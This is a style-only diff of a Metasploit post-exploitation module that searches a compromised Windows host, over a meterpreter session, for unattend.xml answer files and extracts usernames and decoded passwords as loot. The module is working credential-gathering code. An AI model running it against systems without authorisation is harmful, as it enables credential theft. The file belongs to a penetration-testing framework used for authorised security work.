@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,49 +9,50 @@ require 'rex/parser/unattend'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather Unattended Answer File Enumeration',
-      'Description'   => %q{
-          This module will check the file system for a copy of unattend.xml and/or
-        autounattend.xml found in Windows Vista, or newer Windows systems.  And then
-        extract sensitive information such as usernames and decoded passwords.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'Sean Verity <veritysr1980[at]gmail.com>',
-          'sinn3r',
-          'Ben Campbell'
-        ],
-      'References'    =>
-        [
-          ['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
-          ['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
-          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580']
-        ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather Unattended Answer File Enumeration',
+                      'Description'   => %q(
+                          This module will check the file system for a copy of unattend.xml and/or
+                        autounattend.xml found in Windows Vista, or newer Windows systems.  And then
+                        extract sensitive information such as usernames and decoded passwords.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        =>
+                        [
+                          'Sean Verity <veritysr1980[at]gmail.com>',
+                          'sinn3r',
+                          'Ben Campbell'
+                        ],
+                      'References'    =>
+                        [
+                          ['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
+                          ['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
+                          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580']
+                        ],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
 
     register_options(
       [
         OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
-      ], self.class)
+      ], self.class
+    )
   end
-
 
   #
   # Determine if unattend.xml exists or not
   #
   def unattend_exists?(xml_path)
-    x = session.fs.file.stat(xml_path) rescue nil
-    return !!x
+    x = begin
+          session.fs.file.stat(xml_path)
+        rescue
+          nil
+        end
+    !!x
   end
-
 
   #
   # Read and parse the XML file
@@ -59,9 +61,7 @@ class MetasploitModule < Msf::Post
     print_status("Reading #{xml_path}")
     f = session.fs.file.new(xml_path)
     raw = ""
-    until f.eof?
-      raw << f.read
-    end
+    raw << f.read until f.eof?
 
     begin
       xml = REXML::Document.new(raw)
@@ -71,7 +71,7 @@ class MetasploitModule < Msf::Post
       return nil, raw
     end
 
-    return xml, raw
+    [xml, raw]
   end
 
   #
@@ -79,11 +79,10 @@ class MetasploitModule < Msf::Post
   #
   def save_cred_tables(cred_table)
     t = cred_table
-    vprint_line("\n#{t.to_s}\n")
+    vprint_line("\n#{t}\n")
     p = store_loot('windows.unattended.creds', 'text/plain', session, t.to_csv, t.header, t.header)
     print_status("#{t.header} saved as: #{p}")
   end
-
 
   #
   # Save the raw version of unattend.xml
@@ -94,7 +93,6 @@ class MetasploitModule < Msf::Post
     p = store_loot('windows.unattended.raw', 'text/plain', session, data)
     print_status("Raw version of #{fname} saved as: #{p}")
   end
-
 
   #
   # If we spot a path for the answer file, we should check it out too
@@ -109,7 +107,6 @@ class MetasploitModule < Msf::Post
       return ''
     end
   end
-
 
   #
   # Initialize all 7 possible paths for the answer file
@@ -143,9 +140,8 @@ class MetasploitModule < Msf::Post
     reg_path = get_registry_unattend_path
     paths << reg_path unless reg_path.empty?
 
-    return paths
+    paths
   end
-
 
   def run
     init_paths.each do |xml_path|
@@ -163,7 +159,7 @@ class MetasploitModule < Msf::Post
 
       results = Rex::Parser::Unattend.parse(xml)
       table = Rex::Parser::Unattend.create_table(results)
-      table.print unless table.nil?
+      table&.print
       print_line
 
       # Save the data to a file, TODO: Save this as a Mdm::Cred maybe
@@ -172,5 +168,4 @@ class MetasploitModule < Msf::Post
       return unless datastore['GETALL']
     end
   end
-
 end
